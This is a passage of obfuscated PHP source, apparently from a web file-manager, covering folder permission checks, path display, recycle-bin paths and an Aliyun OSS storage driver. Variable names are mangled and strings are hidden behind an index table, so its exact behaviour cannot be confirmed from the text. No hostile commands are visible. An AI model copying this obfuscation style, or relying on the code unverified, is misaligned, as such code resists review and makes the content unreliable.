$ÛÈÁÜ§¤ = array_to_keyvalue($šİÄîæ¶, $©··€í[192]); $ÊÅÓŸùà = Model($©··€í[583])->getSourceList($æêáÊÓ, $ÛÈÁÜ§¤); $ĞŸûï‡â = KodUser::isRoot(); foreach ($šİÄîæ¶ as $ÓÖòÀÁ¸ => &$ä€‘¿ªú) { $ä€‘¿ªú[$©··€í[498]] = $ÊÅÓŸùà[$ä€‘¿ªú[$©··€í[192]]]; if (!$ä€‘¿ªú[$©··€í[498]] && $ä€‘¿ªú[$©··€í[189]] == self::TYPE_GROUP) { $ä€‘¿ªú[$©··€í[498]] = Action($©··€í[584])->pathGroupAuthMake($ä€‘¿ªú[$©··€í[585]]); if (!$ä€‘¿ªú[$©··€í[498]] && !$ĞŸûï‡â) { $ä€‘¿ªú[$©··€í[234]] = !1; $ä€‘¿ªú[$©··€í[233]] = !1; } } if ($ä€‘¿ªú[$©··€í[498]]) { $ä€‘¿ªú[$©··€í[234]] = AuthModel::authCheckEdit($ä€‘¿ªú[$©··€í[498]][$©··€í[499]]); $ä€‘¿ªú[$©··€í[233]] = AuthModel::authCheckView($ä€‘¿ªú[$©··€í[498]][$©··€í[499]]); } $this->groupPathDisplay($ä€‘¿ªú); } unset($ä€‘¿ªú); } public function _listAppendAuthSecret(&$±äÉÉ) { $šŞµü—» =& $_SERVER[¿ÈˆÑ¸ä]; if (Model($šŞµü—»[518])->get($šŞµü—»[586]) != $šŞµü—»[91]) { return; } static $üÃ¡ùÇÜ = false; if (!$üÃ¡ùÇÜ) { $Æˆ›ç²Ã = Model($šŞµü—»[587]); $ö¾º¼üş = Model($šŞµü—»[588]); $üÃ¡ùÇÜ = $ö¾º¼üş->listData(); $üÃ¡ùÇÜ = array_to_keyvalue($üÃ¡ùÇÜ, $šŞµü—»[192]); $¬—à½ŠÒ = json_decode(Model($šŞµü—»[518])->get($šŞµü—»[589]), !0); $¬—à½ŠÒ = array_to_keyvalue($¬—à½ŠÒ, $šŞµü—»[483]); foreach ($üÃ¡ùÇÜ as $ú¥õÈßÄ => $Óô£äÑå) { $èŒ·­ö = $¬—à½ŠÒ[$Óô£äÑå[$šŞµü—»[590]]]; if (!$èŒ·­ö) { $ö¾º¼üş->remove($Óô£äÑå[$šŞµü—»[483]]); unset($üÃ¡ùÇÜ[$ú¥õÈßÄ]); continue; } $¶Ş³óûš = $Æˆ›ç²Ã->listData($èŒ·­ö[$šŞµü—»[498]]); if (!$¶Ş³óûš) { $ö¾º¼üş->remove($Óô£äÑå[$šŞµü—»[483]]); unset($üÃ¡ùÇÜ[$ú¥õÈßÄ]); continue; } $Óô£äÑå[$šŞµü—»[498]] = $¶Ş³óûš; $Óô£äÑå[$šŞµü—»[591]] = $èŒ·­ö; $Óô£äÑå[$šŞµü—»[592]] = Model($šŞµü—»[593])->getInfoSimpleOuter($Óô£äÑå[$šŞµü—»[537]]); $üÃ¡ùÇÜ[$ú¥õÈßÄ] = $Óô£äÑå; } } $âñ©Ô‚ = USER_ID; $™‚Ûô× = array(); $½¢’Šè¢ = $this->_listAppendPath($™‚Ûô×, !0); foreach ($±äÉÉ as $ú¥õÈßÄ => &$Óô£äÑå) { if (!is_array($Óô£äÑå[$šŞµü—»[498]])) { continue; } if ($Óô£äÑå[$šŞµü—»[189]] != $šŞµü—»[594]) { continue; } if (isset($üÃ¡ùÇÜ[$Óô£äÑå[$šŞµü—»[192]]])) { $ÔÔå¿æö = $üÃ¡ùÇÜ[$Óô£äÑå[$šŞµü—»[192]]]; if (!is_array($Óô£äÑå[$šŞµü—»[551]])) { $Óô£äÑå[$šŞµü—»[551]] = array(); } $Óô£äÑå[$šŞµü—»[551]][$šŞµü—»[595]] = $ÔÔå¿æö[$šŞµü—»[590]]; $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[596]] = $ÔÔå¿æö; $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[597]] = $Óô£äÑå[$šŞµü—»[598]]; $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[599]] = $šŞµü—»[91]; if ($ÔÔå¿æö[$šŞµü—»[537]] != $âñ©Ô‚) { $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[499]] = $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[499]] & $ÔÔå¿æö[$šŞµü—»[498]][$šŞµü—»[498]]; } continue; } $£Ş Û¯ = $this->parentLevelArray($Óô£äÑå[$šŞµü—»[600]]); $İ‹óƒœß = array_reverse($£Ş Û¯); foreach ($İ‹óƒœß as $É“„ÒÍ => $Ëè‰¼°) { if (!isset($üÃ¡ùÇÜ[$Ëè‰¼°])) { continue; } $ÔÔå¿æö = $üÃ¡ùÇÜ[$Ëè‰¼°]; $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[596]] = $ÔÔå¿æö; if ($ÔÔå¿æö[$šŞµü—»[537]] != $âñ©Ô‚) { $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[499]] = $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[499]] & $ÔÔå¿æö[$šŞµü—»[498]][$šŞµü—»[498]]; } $ÏÕŞÎ°ğ = $šŞµü—»[12]; $ä†°ğ‡ç = count($£Ş Û¯) - $É“„ÒÍ; for ($¯àœó˜Ì = 0; $¯àœó˜Ì < $ä†°ğ‡ç; $¯àœó˜Ì++) { if (!isset($½¢’Šè¢[$£Ş Û¯[$¯àœó˜Ì]])) { $ÏÕŞÎ°ğ = $šŞµü—»[12]; break; } $ÏÕŞÎ°ğ = $ÏÕŞÎ°ğ . rtrim($½¢’Šè¢[$£Ş Û¯[$¯àœó˜Ì]], $šŞµü—»[8]) . $šŞµü—»[8]; } $Óô£äÑå[$šŞµü—»[498]][$šŞµü—»[597]] = rtrim($ÏÕŞÎ°ğ, $šŞµü—»[8]) . $šŞµü—»[8]; break; } } unset($Óô£äÑå); } public function groupPathDisplay(&$¤°•ı) { $å¾ÇÎÛ‘ =& $_SERVER[¿ÈˆÑ¸ä]; if ($¤°•ı[$å¾ÇÎÛ‘[189]] != self::TYPE_GROUP) { return; } $ÇìÚıãÙ = Model($å¾ÇÎÛ‘[601])->getInfo($¤°•ı[$å¾ÇÎÛ‘[585]]); $¹ïòìùÏ = $this->parentLevelArray($ÇìÚıãÙ[$å¾ÇÎÛ‘[600]]); $ÚîÓŠé¤ = $å¾ÇÎÛ‘[12]; foreach ($¹ïòìùÏ as $óãÆô×) { $‡§»Ú“» = Model($å¾ÇÎÛ‘[601])->getInfo($óãÆô×); $ÚîÓŠé¤ .= $‡§»Ú“»[$å¾ÇÎÛ‘[90]][$å¾ÇÎÛ‘[192]] . $å¾ÇÎÛ‘[50]; } $¤°•ı[$å¾ÇÎÛ‘[602]] = $ÇìÚıãÙ[$å¾ÇÎÛ‘[191]]; $¤°•ı[$å¾ÇÎÛ‘[603]] = $ÇìÚıãÙ[$å¾ÇÎÛ‘[600]]; $¤°•ı[$å¾ÇÎÛ‘[604]] = $ÇìÚıãÙ[$å¾ÇÎÛ‘[605]]; $¤°•ı[$å¾ÇÎÛ‘[606]] = $ÚîÓŠé¤ . $ÇìÚıãÙ[$å¾ÇÎÛ‘[90]][$å¾ÇÎÛ‘[192]]; } protected function _listAppendPath(&$Ÿ¦µ½‰, $ØÊÈÎ…ñ = false) { $çäŠšÄ’ =& $_SERVER[¿ÈˆÑ¸ä]; static $èËÂ«³Ï = array(); $óÑÎ£Åà = array(); $Ü…ÌùÖ€ = array(); if ($ØÊÈÎ…ñ) { return $èËÂ«³Ï; } foreach ($Ÿ¦µ½‰ as &$˜¾ËÕå) { $‰ŞÕ‰ÁÍ = $˜¾ËÕå[$çäŠšÄ’[192]]; if ($˜¾ËÕå[$çäŠšÄ’[496]] == $çäŠšÄ’[91] && $˜¾ËÕå[$çäŠšÄ’[191]] != 0) { $èËÂ«³Ï[$‰ŞÕ‰ÁÍ] = $˜¾ËÕå[$çäŠšÄ’[32]]; } if ($˜¾ËÕå[$çäŠšÄ’[496]] == $çäŠšÄ’[91] && $˜¾ËÕå[$çäŠšÄ’[191]] == 0) { $èËÂ«³Ï[$‰ŞÕ‰ÁÍ] = $this->_listAppendPathRoot($˜¾ËÕå, array()); } if (isset($Ü…ÌùÖ€[$˜¾ËÕå[$çäŠšÄ’[600]]])) { continue; } $Ü…ÌùÖ€[$˜¾ËÕå[$çäŠšÄ’[600]]] = !0; $úéÚÄà² = $this->parentLevelArray($˜¾ËÕå[$çäŠšÄ’[600]]); foreach ($úéÚÄà² as $×Œ­†Á¥ => $îĞ¡—¢) { if (isset($èËÂ«³Ï[$îĞ¡—¢])) { continue; } if ($×Œ­†Á¥ == 0) { $èËÂ«³Ï[$îĞ¡—¢] = $this->_listAppendPathRoot($˜¾ËÕå, $úéÚÄà²); } if ($×Œ­†Á¥ != 0) { $óÑÎ£Åà[] = $îĞ¡—¢; } } } unset($˜¾ËÕå); $óÑÎ£Åà = array_unique($óÑÎ£Åà); if (count($óÑÎ£Åà) > 0) { $¬×Äô´« = array($çäŠšÄ’[502] => array($çäŠšÄ’[503], $óÑÎ£Åà)); if (count($óÑÎ£Åà) == 1) { $ƒŞõã«Ô = $this->sourceInfo($óÑÎ£Åà[0]); $Ãã‘ˆ¶ = is_array($ƒŞõã«Ô) ? array($ƒŞõã«Ô) : !1; } else { $Ãã‘ˆ¶ = $this->field($çäŠšÄ’[607])->where($¬×Äô´«)->select(); } if (!$Ãã‘ˆ¶) { $Ãã‘ˆ¶ = array(); } foreach ($Ãã‘ˆ¶ as $½¸Œğ¥Æ) { $èËÂ«³Ï[$½¸Œğ¥Æ[$çäŠšÄ’[192]]] = $½¸Œğ¥Æ[$çäŠšÄ’[32]]; } } $Ğ±óşöÓ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ıâÔˆ = array(); foreach ($Ÿ¦µ½‰ as &$˜¾ËÕå) { $ÔÆğÓõï = $˜¾ËÕå[$çäŠšÄ’[600]]; $èÔô¬ò± = $çäŠšÄ’[12]; if (isset($ıâÔˆ[$ÔÆğÓõï])) { $èÔô¬ò± = $ıâÔˆ[$ÔÆğÓõï]; } else { $úéÚÄà² = $this->parentLevelArray($˜¾ËÕå[$çäŠšÄ’[600]]); foreach ($úéÚÄà² as $×Œ­†Á¥ => $îĞ¡—¢) { if (isset($èËÂ«³Ï[$îĞ¡—¢])) { $èÔô¬ò± .= $èËÂ«³Ï[$îĞ¡—¢] . $çäŠšÄ’[8]; } } $ıâÔˆ[$ÔÆğÓõï] = $èÔô¬ò±; } $èÔô¬ò± .= $˜¾ËÕå[$çäŠšÄ’[32]]; if ($˜¾ËÕå[$çäŠšÄ’[496]] == $çäŠšÄ’[91]) { $èÔô¬ò± .= $çäŠšÄ’[8]; } $˜¾ËÕå[$çäŠšÄ’[598]] = str_replace($çäŠšÄ’[255], $çäŠšÄ’[8], $èÔô¬ò±); if ($˜¾ËÕå[$çäŠšÄ’[191]] == $çäŠšÄ’[229]) { $˜¾ËÕå[$çäŠšÄ’[32]] = trim($èËÂ«³Ï[$˜¾ËÕå[$çäŠšÄ’[192]]], $çäŠšÄ’[8]); $˜¾ËÕå[$çäŠšÄ’[598]] = $˜¾ËÕå[$çäŠšÄ’[32]] . $çäŠšÄ’[8]; } if (intval($˜¾ËÕå[$çäŠšÄ’[189]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($˜¾ËÕå, $úéÚÄà², $Ğ±óşöÓ); } } unset($˜¾ËÕå); return $Ÿ¦µ½‰; } private function _listAppendPathRecycle(&$Ää¹ßÉ, $‚¢ß¯Ï, $§úê•µ€) { $Ùğ÷Äüá =& $_SERVER[¿ÈˆÑ¸ä]; if (!in_array($§úê•µ€, $‚¢ß¯Ï) && $Ää¹ßÉ[$Ùğ÷Äüá[192]] != $§úê•µ€) { return; } $Ø¦×°‹¼ = explode($Ùğ÷Äüá[8], trim($Ää¹ßÉ[$Ùğ÷Äüá[598]], $Ùğ÷Äüá[8])); $¬Âô‘É = implode($Ùğ÷Äüá[8], array_slice($Ø¦×°‹¼, 2)); $Ää¹ßÉ[$Ùğ÷Äüá[598]] = $Ùğ÷Äüá[8] . LNG($Ùğ÷Äüá[608]) . $Ùğ÷Äüá[8] . ltrim($¬Âô‘É, $Ùğ÷Äüá[8]); $Ää¹ßÉ[$Ùğ÷Äüá[600]] = $Ùğ÷Äüá[609] . implode($Ùğ÷Äüá[50], array_slice($‚¢ß¯Ï, 1)) . $Ùğ÷Äüá[50]; if ($Ää¹ßÉ[$Ùğ÷Äüá[192]] == $§úê•µ€) { $Ää¹ßÉ[$Ùğ÷Äüá[600]] = $Ùğ÷Äüá[609]; $Ää¹ßÉ[$Ùğ÷Äüá[191]] = $Ùğ÷Äüá[229]; $Ää¹ßÉ[$Ùğ÷Äüá[32]] = LNG($Ùğ÷Äüá[608]); } $Ää¹ßÉ[$Ùğ÷Äüá[610]] = $Ùğ÷Äüá[611]; } protected function _listAppendPathRoot(&$§½Ùüéæ, $½ÀíõœÕ) { $¾ÄÌ÷“ß =& $_SERVER[¿ÈˆÑ¸ä]; static $«àéÇ¸‚ = false; static $‚¬„ìƒ = false; $ÅÜ–Ãç = $¾ÄÌ÷“ß[12]; if ($§½Ùüéæ[$¾ÄÌ÷“ß[189]] == self::TYPE_USER) { if ($§½Ùüéæ[$¾ÄÌ÷“ß[585]] == USER_ID) { $ÅÜ–Ãç = LNG($¾ÄÌ÷“ß[612]); if ($«àéÇ¸‚ === !1) { $ëÉİÁö = Model($¾ÄÌ÷“ß[613])->getInfoFull(USER_ID); $«àéÇ¸‚ = _get($ëÉİÁö, $¾ÄÌ÷“ß[614], $¾ÄÌ÷“ß[12]); } if ($‚¬„ìƒ === !1) { $ëÉİÁö = Model($¾ÄÌ÷“ß[613])->getInfoFull(USER_ID); $‚¬„ìƒ = _get($ëÉİÁö, $¾ÄÌ÷“ß[615], $¾ÄÌ÷“ß[12]); } if ($½ÀíõœÕ && $½ÀíõœÕ[0] == $«àéÇ¸‚ || !$½ÀíõœÕ && $§½Ùüéæ[$¾ÄÌ÷“ß[192]] == $«àéÇ¸‚) { $ÅÜ–Ãç = LNG($¾ÄÌ÷“ß[616]); $§½Ùüéæ[$¾ÄÌ÷“ß[617]] = $¾ÄÌ÷“ß[618]; } if ($½ÀíõœÕ && $½ÀíõœÕ[0] == $‚¬„ìƒ || !$½ÀíõœÕ && $§½Ùüéæ[$¾ÄÌ÷“ß[192]] == $‚¬„ìƒ) { $ÅÜ–Ãç = $ÅÜ–Ãç . $¾ÄÌ÷“ß[619] . LNG($¾ÄÌ÷“ß[620]); } if (!$½ÀíõœÕ) { $§½Ùüéæ[$¾ÄÌ÷“ß[32]] = $ÅÜ–Ãç; } } else { $ëÉİÁö = Model($¾ÄÌ÷“ß[613])->getInfoFull($§½Ùüéæ[$¾ÄÌ÷“ß[585]]); $ÎÅûÅâÆ = _get($ëÉİÁö, $¾ÄÌ÷“ß[615], $¾ÄÌ÷“ß[12]); $§½Ùüéæ[$¾ÄÌ÷“ß[621]] = Model($¾ÄÌ÷“ß[593])->getInfoSimpleOuter($§½Ùüéæ[$¾ÄÌ÷“ß[585]]); $ÅÜ–Ãç = LNG($¾ÄÌ÷“ß[622]) . $¾ÄÌ÷“ß[174] . $§½Ùüéæ[$¾ÄÌ÷“ß[621]][$¾ÄÌ÷“ß[32]] . $¾ÄÌ÷“ß[176]; if ($½ÀíõœÕ && $½ÀíõœÕ[0] == $ÎÅûÅâÆ || !$½ÀíõœÕ && $§½Ùüéæ[$¾ÄÌ÷“ß[192]] == $ÎÅûÅâÆ) { $ÅÜ–Ãç = LNG($¾ÄÌ÷“ß[622]) . $¾ÄÌ÷“ß[623] . $§½Ùüéæ[$¾ÄÌ÷“ß[621]][$¾ÄÌ÷“ß[32]] . $¾ÄÌ÷“ß[619] . LNG($¾ÄÌ÷“ß[620]) . $¾ÄÌ÷“ß[176]; } } } else { if ($§½Ùüéæ[$¾ÄÌ÷“ß[189]] == self::TYPE_GROUP) { $–Ú–¯¬¥ = Model($¾ÄÌ÷“ß[601])->getInfoSimple($§½Ùüéæ[$¾ÄÌ÷“ß[585]]); $ÅÜ–Ãç = $–Ú–¯¬¥[$¾ÄÌ÷“ß[32]]; } else { if ($§½Ùüéæ[$¾ÄÌ÷“ß[189]] == self::TYPE_SYSTEM) { $ÅÜ–Ãç = $¾ÄÌ÷“ß[624]; } } } $ÅÜ–Ãç = $ÅÜ–Ãç ? $¾ÄÌ÷“ß[8] . $ÅÜ–Ãç . $¾ÄÌ÷“ß[8] : $¾ÄÌ÷“ß[8]; return $ÅÜ–Ãç; } protected function _listAppendUser(&$À¶Õ’ÔÑ) { $¤ğà¥Ï =& $_SERVER[¿ÈˆÑ¸ä]; $…§œ”ç— = array_to_keyvalue($À¶Õ’ÔÑ, $¤ğà¥Ï[12], $¤ğà¥Ï[537]); $Ú£²¬ëÚ = array_to_keyvalue($À¶Õ’ÔÑ, $¤ğà¥Ï[12], $¤ğà¥Ï[539]); $ıøµöÆ˜ = array_merge($…§œ”ç—, $Ú£²¬ëÚ); $˜ÃšÉğ× = Model($¤ğà¥Ï[613])->userListInfo($ıøµöÆ˜); foreach ($À¶Õ’ÔÑ as &$™åÊ­šğ) { $ßƒ®Š°Ñ = $™åÊ­šğ[$¤ğà¥Ï[537]]; $™åÊ­šğ[$¤ğà¥Ï[537]] = $˜ÃšÉğ×[$ßƒ®Š°Ñ] ? $˜ÃšÉğ×[$ßƒ®Š°Ñ] : !1; $ßƒ®Š°Ñ = $™åÊ­šğ[$¤ğà¥Ï[539]]; $™åÊ­šğ[$¤ğà¥Ï[539]] = $˜ÃšÉğ×[$ßƒ®Š°Ñ] ? $˜ÃšÉğ×[$ßƒ®Š°Ñ] : !1; if (_get($™åÊ­šğ, $¤ğà¥Ï[625], 0)) { $£ãÄ¹Ì = $GLOBALS[$¤ğà¥Ï[6]][$¤ğà¥Ï[92]][$¤ğà¥Ï[626]]; if ($™åÊ­šğ[$¤ğà¥Ï[551]][$¤ğà¥Ï[627]] <= time() - $£ãÄ¹Ì) { $this->metaSet($™åÊ­šğ[$¤ğà¥Ï[192]], $¤ğà¥Ï[628], null); $this->metaSet($™åÊ­šğ[$¤ğà¥Ï[192]], $¤ğà¥Ï[627], null); unset($™åÊ­šğ[$¤ğà¥Ï[551]][$¤ğà¥Ï[628]]); continue; } $Âçñæ¸¿ = $™åÊ­šğ[$¤ğà¥Ï[551]][$¤ğà¥Ï[628]]; $™åÊ­šğ[$¤ğà¥Ï[551]][$¤ğà¥Ï[629]] = Model($¤ğà¥Ï[613])->getInfoSimpleOuter($Âçñæ¸¿); } } unset($™åÊ­šğ); } public function parentLevelArray($™±âëò²) { $ŞØáË¬˜ =& $_SERVER[¿ÈˆÑ¸ä]; $™±âëò² = explode($ŞØáË¬˜[50], trim($™±âëò², $ŞØáË¬˜[50])); return array_to_int(array_filter($™±âëò²)); } public function listAll($«ØŞÛô) { $Ğë›¨Ùç =& $_SERVER[¿ÈˆÑ¸ä]; $¥ÒÒçËµ = $this->sourceInfo($«ØŞÛô); $…Íô×¥Ë = array($Ğë›¨Ùç[630] => array($Ğë›¨Ùç[631], $¥ÒÒçËµ[$Ğë›¨Ùç[600]] . $«ØŞÛô . $Ğë›¨Ùç[632]), $Ğë›¨Ùç[633] => 0); $´ÉÏß»ş = $Ğë›¨Ùç[634]; $·Ó†»·£ = "\114\105\x46\124\40\112\117\x49\116\40{$this->tablePrefix}\151\x6f\137\x66\x69\x6c\x65\x20\146\151\154\x65\x20\x6f\x6e\x20\163\x6f\x75\x72\143\145\56\x66\151\x6c\x65\111\104\40\x3d\40\x66\151\154\145\56\x66\x69\x6c\145\111\104"; $§‡ÄËŞé = $this->alias($Ğë›¨Ùç[529])->field($´ÉÏß»ş)->where($…Íô×¥Ë)->join($·Ó†»·£)->select(); $this->_listAppendAuth($§‡ÄËŞé); $this->_listAppendUser($§‡ÄËŞé); $this->_listAppendPath($§‡ÄËŞé); $§‡ÄËŞé = array_to_keyvalue($§‡ÄËŞé, $Ğë›¨Ùç[192]); $Öã×ãË¾ = "\x2f{$¥ÒÒçËµ[$Ğë›¨Ùç[32]]}\x2f"; $Öã×ãË¾ = $Öã×ãË¾ == $Ğë›¨Ùç[255] ? $Ğë›¨Ùç[8] : $Öã×ãË¾; $›æ¡³²ı = array(); foreach ($§‡ÄËŞé as $¢›êÁ‰ => $ñúìÄ©¼) { $ˆ÷˜“şÜ = $this->parentLevelArray($ñúìÄ©¼[$Ğë›¨Ùç[600]]); array_shift($ˆ÷˜“şÜ); $ù‰Ë›Î¯ = $Öã×ãË¾; for ($×®ü«–© = 0; $×®ü«–© < count($ˆ÷˜“şÜ); $×®ü«–©++) { $ù‰Ë›Î¯ .= $§‡ÄËŞé[$ˆ÷˜“şÜ[$×®ü«–©]][$Ğë›¨Ùç[32]] . $Ğë›¨Ùç[8]; } $ù‰Ë›Î¯ .= $ñúìÄ©¼[$Ğë›¨Ùç[32]]; if ($ñúìÄ©¼[$Ğë›¨Ùç[496]]) { $ù‰Ë›Î¯ .= $Ğë›¨Ùç[8]; } $ë¶§æ€ = array($Ğë›¨Ùç[506] => str_replace($Ğë›¨Ùç[255], $Ğë›¨Ùç[8], str_replace($Ğë›¨Ùç[255], $Ğë›¨Ùç[8], str_replace($Ğë›¨Ùç[255], $Ğë›¨Ùç[8], $ù‰Ë›Î¯))), $Ğë›¨Ùç[635] => intval($ñúìÄ©¼[$Ğë›¨Ùç[496]]), $Ğë›¨Ùç[636] => intval($ñúìÄ©¼[$Ğë›¨Ùç[79]]), $Ğë›¨Ùç[88] => intval($ñúìÄ©¼[$Ğë›¨Ùç[88]]), $Ğë›¨Ùç[90] => $this->pathInfoFilter($ñúìÄ©¼)); if (!$ë¶§æ€[$Ğë›¨Ùç[496]]) { $ë¶§æ€[$Ğë›¨Ùç[553]] = $ñúìÄ©¼[$Ğë›¨Ùç[553]]; } $›æ¡³²ı[] = $ë¶§æ€; } $›æ¡³²ı = array_sort_by($›æ¡³²ı, $Ğë›¨Ùç[87]); return $›æ¡³²ı; } } goto dËÓ™¸‘íã; câ’ÁŠ‹Ñ‡: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ÚãÇô¦) { parent::__construct(); include_once SDK_DIR . $_SERVER[¿ÈˆÑ¸ä][1607]; $this->_init($ÚãÇô¦); } public function _init($”ìªİóÚ) { $¸ƒ—©œÈ =& $_SERVER[¿ÈˆÑ¸ä]; $this->config = $”ìªİóÚ; foreach ($”ìªİóÚ as $¶è‹½‘ => $ºÛÏûˆò) { if (isset($this->{$¶è‹½‘})) { $this->{$¶è‹½‘} = $ºÛÏûˆò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¸ƒ—©œÈ[1608] . LNG($¸ƒ—©œÈ[1609])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $íÕÓ”Û¾ =& $_SERVER[¿ÈˆÑ¸ä]; $ÅÑò÷»Å = new OSS\Model\CorsConfig(); $öÇæ™²¤ = new OSS\Model\CorsRule(); $öÇæ™²¤->addAllowedOrigin($íÕÓ”Û¾[1610]); $öÇæ™²¤->addAllowedMethod($íÕÓ”Û¾[1611]); $öÇæ™²¤->addAllowedMethod($íÕÓ”Û¾[1612]); $öÇæ™²¤->addAllowedMethod($íÕÓ”Û¾[1613]); $öÇæ™²¤->addAllowedMethod($íÕÓ”Û¾[1614]); $öÇæ™²¤->addAllowedMethod($íÕÓ”Û¾[163]); $öÇæ™²¤->setMaxAgeSeconds(600); $öÇæ™²¤->addExposeHeader($íÕÓ”Û¾[1615]); $öÇæ™²¤->addAllowedHeader($íÕÓ”Û¾[1610]); $ÅÑò÷»Å->addRule($öÇæ™²¤); try { $this->client->putBucketCors($this->bucket, $ÅÑò÷»Å); } catch (OSS\Core\OssException $èà©¨ìÈ) { $this->writeLog(__FUNCTION__ . $íÕÓ”Û¾[213] . $èà©¨ìÈ->getMessage()); return !1; } return !0; } public function getBucketCors() { $Õ¸ª³…ş =& $_SERVER[¿ÈˆÑ¸ä]; $’¯“×…Ê = null; try { $’¯“×…Ê = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ş¦ÑØ–ƒ) { $this->writeLog(__FUNCTION__ . $Õ¸ª³…ş[213] . $ş¦ÑØ–ƒ->getMessage()); return null; } if (!$’¯“×…Ê || !($›åéÄ€ = $’¯“×…Ê->getRules())) { return null; } $Ù¤úüâû = $›åéÄ€[0]->getAllowedOrigins(); $‡¹÷¬Ü¢ = $›åéÄ€[0]->getAllowedMethods(); $ÛĞ‘¢©ä = $›åéÄ€[0]->getMaxAgeSeconds(); $Œø—Ù…† = $›åéÄ€[0]->getExposeHeaders(); $åŞÎÙÄ = $›åéÄ€[0]->getAllowedHeaders(); return array($Õ¸ª³…ş[219] => isset($Ù¤úüâû[0]) ? $Ù¤úüâû[0] : $Õ¸ª³…ş[12], $Õ¸ª³…ş[223] => $‡¹÷¬Ü¢, $Õ¸ª³…ş[1616] => $ÛĞ‘¢©ä, $Õ¸ª³…ş[1617] => isset($Œø—Ù…†[0]) ? $Œø—Ù…†[0] : $Õ¸ª³…ş[12], $Õ¸ª³…ş[220] => isset($åŞÎÙÄ[0]) ? $åŞÎÙÄ[0] : $Õ¸ª³…ş[12]); } public function isBucketCors() { $óİ»ÄêÑ =& $_SERVER[¿ÈˆÑ¸ä]; $¹«Û„°Ó = $this->getBucketCors(); if (!$¹«Û„°Ó || !is_array($¹«Û„°Ó)) { return !1; } if ($¹«Û„°Ó[$óİ»ÄêÑ[219]] != $óİ»ÄêÑ[221] || $¹«Û„°Ó[$óİ»ÄêÑ[220]] != $óİ»ÄêÑ[221]) { return !1; } $ğŒáŠƒ = array_map($óİ»ÄêÑ[222], $¹«Û„°Ó[$óİ»ÄêÑ[223]]); if (!is_array($ğŒáŠƒ)) { $ğŒáŠƒ = array(); } $ßØœ‰Ù— = array($óİ»ÄêÑ[224], $óİ»ÄêÑ[225], $óİ»ÄêÑ[226], $óİ»ÄêÑ[227], $óİ»ÄêÑ[228]); $‡ÑÌ™¹ = array_diff($ßØœ‰Ù—, $ğŒáŠƒ); return empty($‡ÑÌ™¹); } public function mkfile($àæşÈáË, $Óæ èŸ = '', $ş„ï‰” = REPEAT_RENAME) { $ïÊ¨ò¿ = $this->setContent($àæşÈáË, $Óæ èŸ); if ($ïÊ¨ò¿ !== !1) { return $this->getPathOuter($àæşÈáË); } return !1; } public function mkdir($ê¦¤“íÏ, $ôÅ‚Ù½¿ = REPEAT_SKIP) { if ($ôÅ‚Ù½¿ && $this->_isFolder($ê¦¤“íÏ)) { return $this->getPathOuter($ê¦¤“íÏ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ê¦¤“íÏ)); } catch (OSS\Core\OssException $áŸ¡­˜) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][213] . $áŸ¡­˜->getMessage()); return !1; } return $this->getPathOuter($ê¦¤“íÏ); } private function fileList($¸š·‘€ã, $ï«Õ”À‚ = '', $®ÈùÕ©ß = 0) { $Ê“Ú‹¨ =& $_SERVER[¿ÈˆÑ¸ä]; $¸š·‘€ã = trim($¸š·‘€ã, $Ê“Ú‹¨[8]); $éˆÅì¡ = empty($¸š·‘€ã) && $¸š·‘€ã !== $Ê“Ú‹¨[229] ? $Ê“Ú‹¨[12] : $¸š·‘€ã . $Ê“Ú‹¨[8]; $éğğ³ÙÇ = $Ê“Ú‹¨[12]; $¢áÚ¦Â× = 1000; $Àöê¢œÓ = $èÉ³ù˜Í = array(); while (!0) { check_abort(); $¢ê´Å¤Ã = array($Ê“Ú‹¨[1618] => $ï«Õ”À‚, $Ê“Ú‹¨[1619] => $éˆÅì¡, $Ê“Ú‹¨[1620] => $¢áÚ¦Â×, $Ê“Ú‹¨[1621] => $éğğ³ÙÇ); try { $×ªĞ¸óÁ = $this->client->listObjects($this->bucket, $¢ê´Å¤Ã); } catch (OSS\Core\OssException $æëÎ¸Ë‡) { $this->writeLog(__FUNCTION__ . $Ê“Ú‹¨[213] . $æëÎ¸Ë‡->getMessage()); break; } $éğğ³ÙÇ = $×ªĞ¸óÁ->getNextMarker(); $ñ†ÆËä = $×ªĞ¸óÁ->getObjectList(); $•¢ì¨‚Ö = $×ªĞ¸óÁ->getPrefixList(); foreach ($ñ†ÆËä as $õÂ»„ñ) { if ($õÂ»„ñ->getKey() == $éˆÅì¡) { continue; } $Èëåñ¿• = $õÂ»„ñ->getKey(); $Ø£Æ¹ä = $õÂ»„ñ->getSize(); $áÃÅ´±£ = $õÂ»„ñ->getLastModified(); $ŠãşÙ÷ = trim($õÂ»„ñ->getETag(), $Ê“Ú‹¨[119]); $œ—­şï = $®ÈùÕ©ß ? array($Ê“Ú‹¨[32] => $Èëåñ¿•, $Ê“Ú‹¨[79] => $Ø£Æ¹ä, $Ê“Ú‹¨[205] => strtotime($áÃÅ´±£), $Ê“Ú‹¨[1622] => $ŠãşÙ÷) : $Èëåñ¿•; $ÌæÎ¯œ = $Ø£Æ¹ä == 0 && substr($Èëåñ¿•, strlen($Èëåñ¿•) - 1, 1) == $Ê“Ú‹¨[8] ? !0 : !1; $ŒØ–à = array($Ê“Ú‹¨[79] => $Ø£Æ¹ä, $Ê“Ú‹¨[1623] => $Ø£Æ¹ä, $Ê“Ú‹¨[88] => strtotime($áÃÅ´±£), $Ê“Ú‹¨[1624] => 